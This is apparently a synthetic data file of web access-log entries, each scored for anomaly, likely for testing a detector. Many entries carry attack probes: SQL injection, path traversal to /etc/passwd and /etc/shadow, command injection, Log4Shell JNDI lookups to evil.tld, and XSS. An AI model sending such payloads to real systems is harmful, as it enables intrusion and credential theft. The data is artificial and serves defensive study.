score_content,score_session,score_fused,line
2.3439993858337402,779.51171875,390.92785906791687,{"remote_addr": "192.245.116.19", "time_local": "11/Jan/2025:09:04:46 -0700", "request": "PUT /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6563, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.756218433380127,1418.6556396484375,710.7059290409088,{"remote_addr": "11.113.72.154", "time_local": "11/Jan/2025:09:04:47 -0700", "request": "DELETE /api/products HTTP/2", "status": 304, "body_bytes_sent": 690, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.695604681968689,725.8275146484375,363.7615596652031,{"remote_addr": "77.213.46.171", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 14030, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.68357515335083,514.880615234375,258.2820951938629,{"remote_addr": "236.5.112.82", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 1888, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.568091630935669,776.1387939453125,388.8534427881241,{"remote_addr": "199.215.203.158", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 4602, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
3.819507122039795,2090.141845703125,1046.9806764125824,{"remote_addr": "141.104.147.104", "time_local": "11/Jan/2025:09:04:49 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 302, "body_bytes_sent": 362, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.0086357593536377,1886.4580078125,944.2333217859268,{"remote_addr": "230.232.109.178", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "PUT /admin HTTP/2", "status": 302, "body_bytes_sent": 17754, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
6.53243350982666,903.3655395507812,454.94898653030396,{"remote_addr": "141.193.176.35", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 10578, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
1.368462085723877,580.2730712890625,290.8207666873932,{"remote_addr": "195.95.15.43", "time_local": "11/Jan/2025:09:04:51 -0700", "request": "POST /contact HTTP/2", "status": 200, "body_bytes_sent": 4595, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.575857162475586,774.8778076171875,388.22683238983154,{"remote_addr": "53.190.148.224", "time_local": "11/Jan/2025:09:04:52 -0700", "request": "TRACE /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3617, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
6.12216854095459,834.7161254882812,420.4191470146179,{"remote_addr": "134.147.153.210", "time_local": "11/Jan/2025:09:04:53 -0700", "request": "OPTIONS /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 1183, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
1.8904460668563843,649.1463623046875,325.51840418577194,{"remote_addr": "242.211.132.20", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "PUT /cgi-bin/test.cgi HTTP/2", "status": 204, "body_bytes_sent": 1310, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.8726555109024048,830.9869995117188,416.4298275113106,{"remote_addr": "254.170.38.17", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 248, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
1.784285545349121,640.3185424804688,321.05141401290894,{"remote_addr": "169.115.70.28", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 15512, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.3816747665405273,774.2982177734375,387.839946269989,{"remote_addr": "29.229.102.73", "time_local": "11/Jan/2025:09:04:55 -0700", "request": "GET /server-status HTTP/2", "status": 200, "body_bytes_sent": 729, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
2.1409568786621094,5259.5556640625,2630.848310470581,{"remote_addr": "68.208.43.228", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "POST /logout HTTP/2", "status": 403, "body_bytes_sent": 616, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.6806445121765137,1421.196533203125,711.9385888576508,{"remote_addr": "98.51.102.213", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "DELETE /index.html HTTP/2", "status": 304, "body_bytes_sent": 14646, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
5.190883159637451,840.1429443359375,422.6669137477875,{"remote_addr": "194.142.1.7", "time_local": "11/Jan/2025:09:04:57 -0700", "request": "HEAD /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 15559, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.416109323501587,65.21827697753906,33.317193150520325,{"remote_addr": "25.57.220.199", "time_local": "11/Jan/2025:09:04:58 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 5220, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
9.450986862182617,2038.085205078125,1023.7680959701538,{"remote_addr": "201.182.152.162", "time_local": "11/Jan/2025:09:04:59 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 10869, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.8032621145248413,829.2548828125,415.5290724635124,{"remote_addr": "200.72.128.164", "time_local": "11/Jan/2025:09:05:00 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 200, "body_bytes_sent": 6160, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.9686764478683472,53.71228790283203,27.84048217535019,{"remote_addr": "187.99.162.110", "time_local": "11/Jan/2025:09:05:01 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 2668, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
3.3621370792388916,2196.3671875,1099.8646622896194,{"remote_addr": "108.254.218.45", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 304, "body_bytes_sent": 14706, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
6.263286590576172,824.5325927734375,415.39793968200684,{"remote_addr": "201.97.140.251", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 8702, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.3955093622207642,1407.1741943359375,704.2848518490791,{"remote_addr": "200.235.160.58", "time_local": "11/Jan/2025:09:05:03 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 14038, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
6.1151814460754395,644.5455932617188,325.3303873538971,{"remote_addr": "62.4.133.150", "time_local": "11/Jan/2025:09:05:04 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 16281, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.2996186017990112,580.3151245117188,290.8073715567589,{"remote_addr": "244.39.118.82", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 4174, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
2.4814038276672363,2076.49609375,1039.4887487888336,{"remote_addr": "203.72.250.207", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 302, "body_bytes_sent": 3492, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
1.291551113128662,53.169769287109375,27.23066020011902,{"remote_addr": "153.24.142.110", "time_local": "11/Jan/2025:09:05:06 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8922, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.4385433197021484,56.7393798828125,29.088961601257324,{"remote_addr": "125.214.230.195", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 15544, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.76667594909668,84.27804565429688,44.52236080169678,{"remote_addr": "246.10.198.240", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1391, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
6.092191696166992,88.42652130126953,47.25935649871826,{"remote_addr": "36.97.68.31", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10904, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
6.55064582824707,5121.9560546875,2564.2533502578735,{"remote_addr": "228.183.10.247", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 401, "body_bytes_sent": 1321, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
3.103511095046997,5786.26611328125,2894.6848121881485,{"remote_addr": "50.223.219.223", "time_local": "11/Jan/2025:09:05:09 -0700", "request": "DELETE / HTTP/2", "status": 404, "body_bytes_sent": 342, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
4.52640438079834,623.5001220703125,314.0132632255554,{"remote_addr": "219.41.147.148", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 8850, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.634220600128174,66.8026351928711,34.718427896499634,{"remote_addr": "139.70.29.153", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5126, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.0071544647216797,832.9776611328125,417.4924077987671,{"remote_addr": "215.199.122.98", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "PUT /contact HTTP/2", "status": 200, "body_bytes_sent": 15064, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.8122971057891846,1885.1361083984375,943.4742027521133,{"remote_addr": "95.112.233.92", "time_local": "11/Jan/2025:09:05:11 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 12334, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.5759409666061401,66.28789520263672,33.93191808462143,{"remote_addr": "95.167.130.150", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 9765, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.8514013290405273,1304.7557373046875,653.303569316864,{"remote_addr": "127.168.83.86", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /login HTTP/2", "status": 302, "body_bytes_sent": 13432, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
6.359466552734375,824.4940185546875,415.42674255371094,{"remote_addr": "80.164.25.181", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3103, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
4.542425155639648,1924.0081787109375,964.2753019332886,{"remote_addr": "171.74.41.136", "time_local": "11/Jan/2025:09:05:13 -0700", "request": "HEAD /dashboard HTTP/2", "status": 304, "body_bytes_sent": 16391, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
5.082964897155762,5106.61279296875,2555.847878932953,{"remote_addr": "226.240.164.45", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "HEAD /logout HTTP/2", "status": 401, "body_bytes_sent": 449, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.200985908508301,5916.3037109375,2959.252348423004,{"remote_addr": "96.175.201.226", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "GET /search?q=camera HTTP/2", "status": 403, "body_bytes_sent": 608, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.3742356300354004,2115.31201171875,1058.3431236743927,{"remote_addr": "239.87.196.197", "time_local": "11/Jan/2025:09:05:15 -0700", "request": "TRACE /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 11455, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
2.4534196853637695,814.5863037109375,408.51986169815063,{"remote_addr": "224.46.51.15", "time_local": "11/Jan/2025:09:05:16 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 5083, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
2.026484966278076,52.720855712890625,27.37367033958435,{"remote_addr": "28.179.90.47", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1056, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.6059763431549072,1932.501220703125,967.05359852314,{"remote_addr": "184.136.203.162", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "GET /profile HTTP/2", "status": 304, "body_bytes_sent": 7067, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
1.8642997741699219,724.4952392578125,363.1797695159912,{"remote_addr": "65.27.133.15", "time_local": "11/Jan/2025:09:05:18 -0700", "request": "POST /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4572, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
1.714309811592102,5716.7568359375,2859.235572874546,{"remote_addr": "15.79.229.49", "time_local": "11/Jan/2025:09:05:19 -0700", "request": "GET /contact HTTP/2", "status": 403, "body_bytes_sent": 363, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
3.781456708908081,659.6326904296875,331.7070735692978,{"remote_addr": "8.46.238.63", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 12687, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.4299306869506836,1343.535888671875,672.4829096794128,{"remote_addr": "239.63.227.208", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "GET /assets/app.js HTTP/2", "status": 301, "body_bytes_sent": 2340, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
6.314196586608887,728.5523681640625,367.4332823753357,{"remote_addr": "161.135.94.227", "time_local": "11/Jan/2025:09:05:21 -0700", "request": "OPTIONS /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 2412, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
1.5112119913101196,829.4200439453125,415.4656279683113,{"remote_addr": "235.38.58.140", "time_local": "11/Jan/2025:09:05:22 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 4173, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.3483539819717407,686.7760009765625,344.0621774792671,{"remote_addr": "128.105.3.52", "time_local": "11/Jan/2025:09:05:23 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 12576, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
9.585186004638672,1969.177978515625,989.3815822601318,{"remote_addr": "167.233.72.38", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 302, "body_bytes_sent": 1242, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.1118013858795166,5233.271484375,2617.6916428804398,{"remote_addr": "204.66.199.225", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "POST /index.html HTTP/2", "status": 403, "body_bytes_sent": 81, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.420025110244751,583.9549560546875,292.6874905824661,{"remote_addr": "11.25.158.168", "time_local": "11/Jan/2025:09:05:25 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 14430, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
5.853308200836182,2079.431640625,1042.642474412918,{"remote_addr": "148.246.69.79", "time_local": "11/Jan/2025:09:05:26 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 302, "body_bytes_sent": 4055, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
1.5188685655593872,1366.279296875,683.8990827202797,{"remote_addr": "93.75.143.136", "time_local": "11/Jan/2025:09:05:27 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 2101, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
5.816576957702637,635.4749755859375,320.64577627182007,{"remote_addr": "224.169.93.210", "time_local": "11/Jan/2025:09:05:28 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8339, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
6.396109580993652,667.6744384765625,337.0352740287781,{"remote_addr": "128.128.242.42", "time_local": "11/Jan/2025:09:05:29 -0700", "request": "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17135, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.3525596857070923,635.5822143554688,318.4673870205879,{"remote_addr": "213.180.115.55", "time_local": "11/Jan/2025:09:05:30 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2841, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.2984974384307861,774.5523681640625,387.92543280124664,{"remote_addr": "88.241.11.197", "time_local": "11/Jan/2025:09:05:31 -0700", "request": "TRACE /.git/config HTTP/2", "status": 200, "body_bytes_sent": 7025, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
2.0535809993743896,1356.86474609375,679.4591635465622,{"remote_addr": "18.42.125.166", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "PUT /about HTTP/2", "status": 302, "body_bytes_sent": 15660, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.43862247467041,816.2440185546875,409.34132051467896,{"remote_addr": "179.112.172.176", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "DELETE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 13260, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
6.048093795776367,783.4141845703125,394.73113918304443,{"remote_addr": "7.21.136.71", "time_local": "11/Jan/2025:09:05:33 -0700", "request": "OPTIONS /server-status HTTP/2", "status": 200, "body_bytes_sent": 17707, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
1.5449951887130737,1935.5570068359375,968.5510010123253,{"remote_addr": "139.206.242.159", "time_local": "11/Jan/2025:09:05:34 -0700", "request": "POST /dashboard HTTP/2", "status": 302, "body_bytes_sent": 17410, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
5.857617378234863,835.1141357421875,420.4858765602112,{"remote_addr": "34.171.190.41", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 8585, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
6.533242702484131,5221.763671875,2614.148457288742,{"remote_addr": "59.151.127.62", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 403, "body_bytes_sent": 114, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
7.590673923492432,813.76123046875,410.6759521961212,{"remote_addr": "109.37.251.205", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 16746, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
2.3762729167938232,5154.7275390625,2578.551905989647,{"remote_addr": "53.249.188.148", "time_local": "11/Jan/2025:09:05:36 -0700", "request": "TRACE /index.html HTTP/2", "status": 403, "body_bytes_sent": 118, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
3.0613105297088623,5634.72119140625,2818.8912509679794,{"remote_addr": "141.88.220.206", "time_local": "11/Jan/2025:09:05:37 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 401, "body_bytes_sent": 601, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
1.6024059057235718,1932.8759765625,967.2391912341118,{"remote_addr": "67.74.89.227", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 5645, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
6.139593124389648,873.2559814453125,439.6977872848511,{"remote_addr": "37.84.254.186", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 170, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
2.6788535118103027,2166.97216796875,1084.8255107402802,{"remote_addr": "214.151.119.72", "time_local": "11/Jan/2025:09:05:39 -0700", "request": "DELETE / HTTP/2", "status": 304, "body_bytes_sent": 4208, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.8254176378250122,5927.9970703125,2964.9112439751625,{"remote_addr": "67.193.198.62", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 403, "body_bytes_sent": 1073, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
1.7949645519256592,580.4736328125,291.13429868221283,{"remote_addr": "181.248.171.87", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 8759, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
2.9289474487304688,521.0447998046875,261.986873626709,{"remote_addr": "122.150.161.62", "time_local": "11/Jan/2025:09:05:41 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16499, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.8731352090835571,631.1141357421875,316.49363547563553,{"remote_addr": "238.227.252.24", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 2262, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.2115377187728882,813.3494262695312,407.28048199415207,{"remote_addr": "123.52.49.89", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "GET /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 10618, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
6.076210975646973,69.85841369628906,37.96731233596802,{"remote_addr": "197.54.97.224", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "OPTIONS /about HTTP/2", "status": 200, "body_bytes_sent": 5762, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.603244304656982,69.9881591796875,37.29570174217224,{"remote_addr": "241.177.150.138", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 11037, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.717827558517456,579.8643188476562,290.79107320308685,{"remote_addr": "36.184.68.223", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 2226, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
1.324313759803772,829.8958740234375,415.61009389162064,{"remote_addr": "99.229.118.59", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 8304, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.3748818635940552,685.7758178710938,343.5753498673439,{"remote_addr": "74.190.96.21", "time_local": "11/Jan/2025:09:05:45 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 9188, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
